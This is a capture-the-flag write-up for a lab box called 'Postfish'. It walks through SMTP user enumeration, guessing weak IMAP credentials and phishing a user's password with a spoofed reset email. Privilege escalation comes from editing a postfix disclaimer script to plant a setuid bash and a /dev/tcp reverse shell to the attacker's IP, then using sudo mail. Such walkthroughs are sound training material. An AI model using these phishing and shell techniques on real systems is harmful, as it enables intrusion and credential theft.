# Postfish

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 3000 -Pn 192.168.183.137
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-12 14:08 +08
Nmap scan report for 192.168.183.137
Host is up (0.17s latency).
Not shown: 65528 closed tcp ports (conn-refused)
PORT    STATE SERVICE
22/tcp  open  ssh
25/tcp  open  smtp
80/tcp  open  http
110/tcp open  pop3
143/tcp open  imap
993/tcp open  imaps
995/tcp open  pop3s
```

This box involves testing mail services. We have to add `postfish.off` to our `/etc/hosts` file to view the website on port 80.&#x20;

### Web Enumeration

The website looked rather static:

<figure><img src="../../../.gitbook/assets/image (2903).png" alt=""><figcaption></figcaption></figure>

There was a 'Team' page, and when viewed we get some names and roles:

<figure><img src="../../../.gitbook/assets/image (491).png" alt=""><figcaption></figcaption></figure>

Interesting.

### SMTP Enumeration --> Phishing Link

The website had nothing else to offer, so I went looking for exploits pertaining to the mail servers. I tested some usernames and departments like HR, and found HR existed on the server:

```
$ smtp-user-enum -M VRFY -u HR -t 192.168.183.137
Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )

 ----------------------------------------------------------
|                   Scan Information                       |
 ----------------------------------------------------------

Mode ..................... VRFY
Worker Processes ......... 5
Target count ............. 1
Username count ........... 1
Target TCP port .......... 25
Query timeout ............ 5 secs
Target domain ............ 

######## Scan started at Wed Jul 12 14:15:41 2023 #########
192.168.183.137: HR exists
```

I tried some low hanging fruits, like logging in with `hr:hr` and `postfish:postfish`. Eventually, `sales:sales` worked on IMAP:

{% code overflow="wrap" %}
```
$ nc -nv 192.168.183.137 143
(UNKNOWN) [192.168.183.137] 143 (imap2) open
* OK [CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE LITERAL+ STARTTLS AUTH=PLAIN] Dovecot (Ubuntu) ready.
A1 LOGIN sales sales
A1 OK [CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE SORT SORT=DISPLAY THREAD=REFERENCES THREAD=REFS THREAD=ORDEREDSUBJECT MULTIAPPEND URL-PARTIAL CATENATE UNSELECT CHILDREN NAMESPACE UIDPLUS LIST-EXTENDED I18NLEVEL=1 CONDSTORE QRESYNC ESEARCH ESORT SEARCHRES WITHIN CONTEXT=SEARCH LIST-STATUS BINARY MOVE SNIPPET=FUZZY PREVIEW=FUZZY LITERAL+ NOTIFY SPECIAL-USE] Logged in
```
{% endcode %}

I was able to find one message present within the Inbox:

```
A1 STATUS INBOX (MESSAGES UNSEEN RECENT)
* STATUS INBOX (MESSAGES 1 RECENT 1 UNSEEN 1)
A1 OK Status completed (0.001 + 0.000 secs).
```

We can read this message:

{% code overflow="wrap" %}
```
A1 SELECT INBOX
A1 FETCH 1 body[text]
* 1 FETCH (FLAGS (\Seen \Recent) BODY[TEXT] {153}
Hi Sales team,

We will be sending out password reset links in the upcoming week so that we can get you registered on the ERP system.

Regards,
IT
)
A1 OK Fetch completed (0.001 + 0.000 secs).
```
{% endcode %}

So there's some password reset links being sent out, and perhaps we can trick a user into clicking on our link. I used `swaks` to send an email to send emails:

{% code overflow="wrap" %}
```bash
$ swaks --to SALES@postfish.off --from IT@postfish.off --header "Subject:Password Reset" --body "Click here to reset your password! http://192.168.45.208/password" --server 192.168.183.137
```
{% endcode %}

The above doesn't work, so I used 'Brian Moore', which is the name of the user part of the Sales team based on the website. There are tons of username generators online based on a name:

```bash
$ python2 username.py -n 'brian moore' > usernames
$ sed -i s/$/@postfish.off/ usernames
```

Afterwards, we can test which user is present on the server:

```
$ smtp-user-enum -M VRFY -U usernames -t 192.168.183.137
Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )

 ----------------------------------------------------------
|                   Scan Information                       |
 ----------------------------------------------------------

Mode ..................... VRFY
Worker Processes ......... 5
Usernames file ........... usernames
Target count ............. 1
Username count ........... 93
Target TCP port .......... 25
Query timeout ............ 5 secs
Target domain ............ 

######## Scan started at Wed Jul 12 14:31:35 2023 #########
192.168.183.137: @postfish.off exists
192.168.183.137: brian.moore@postfish.off exists
######## Scan completed at Wed Jul 12 14:31:49 2023 #########
```

`brian.moore` exists, so let's send an email to him and start a listener port to see if he clicks on our link. `swaks` doesn't seem to work for some reason, so we can just use `nc`:

```
$ nc -vn 192.168.183.137 25

MAIL FROM: IT@postfish.off
RCPT TO: brian.moore@postfish.off
DATA

Hello, 

Reset password here. http://192.168.45.208/

.

QUIT
```

After the mail sends, we get a callback on our listener port with creds:

<figure><img src="../../../.gitbook/assets/image (3586).png" alt=""><figcaption></figcaption></figure>

We can use this password to `ssh` in as `brian.moore`:

<figure><img src="../../../.gitbook/assets/image (3844).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

### Mail Disclaimer --> Filter Shell

I ran a `linpeas.sh` scan on the machine, and it found this interesting folder:

```
[+] Readable files belonging to root and readable by me but not world readable
-rwxrwx--- 1 root filter 1184 Jul 12 06:42 /etc/postfix/disclaimer
```

It was a `bash` script:

```bash
brian.moore@postfish:~$ cat /etc/postfix/disclaimer
#!/bin/bash
# Localize these.
INSPECT_DIR=/var/spool/filter
SENDMAIL=/usr/sbin/sendmail

####### Changed From Original Script #######
DISCLAIMER_ADDRESSES=/etc/postfix/disclaimer_addresses
####### Changed From Original Script END #######

# Exit codes from <sysexits.h>
EX_TEMPFAIL=75
EX_UNAVAILABLE=69

# Clean up when done or when aborting.
trap "rm -f in.$$" 0 1 2 3 15

# Start processing.
cd $INSPECT_DIR || { echo $INSPECT_DIR does not exist; exit
$EX_TEMPFAIL; }

cat >in.$$ || { echo Cannot save mail to file; exit $EX_TEMPFAIL; }

####### Changed From Original Script #######
# obtain From address
from_address=`grep -m 1 "From:" in.$$ | cut -d "<" -f 2 | cut -d ">" -f 1`

if [ `grep -wi ^${from_address}$ ${DISCLAIMER_ADDRESSES}` ]; then
  /usr/bin/altermime --input=in.$$ \
                   --disclaimer=/etc/postfix/disclaimer.txt \
                   --disclaimer-html=/etc/postfix/disclaimer.txt \
                   --xheader="X-Copyrighted-Material: Please visit http://www.company.com/privacy.htm" || \
                    { echo Message content rejected; exit $EX_UNAVAILABLE; }
fi
####### Changed From Original Script END #######

$SENDMAIL "$@" <in.$$

exit $?
```

Users part of the `filter` group can write to this, and `brian.moore` is part of that group. I added this to the script:

```bash
cp /bin/bash /tmp
chmod u+s /tmp/bash
bash -i >& /dev/tcp/192.168.45.208/21 0>&1
```

This script is triggered by sending emails, so we can send another one to the machine without the phishing link to get another reverse shell:

<figure><img src="../../../.gitbook/assets/image (2120).png" alt=""><figcaption></figcaption></figure>

### Sudo Mail --> Root

This new user can execute `mail` using `sudo`:

```
filter@postfish:/var/spool/postfix$ sudo -l
Matching Defaults entries for filter on postfish:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User filter may run the following commands on postfish:
    (ALL) NOPASSWD: /usr/bin/mail *
```

We can get a `root` shell using the commands from GTFOBins:

<figure><img src="../../../.gitbook/assets/image (1536).png" alt=""><figcaption></figcaption></figure>
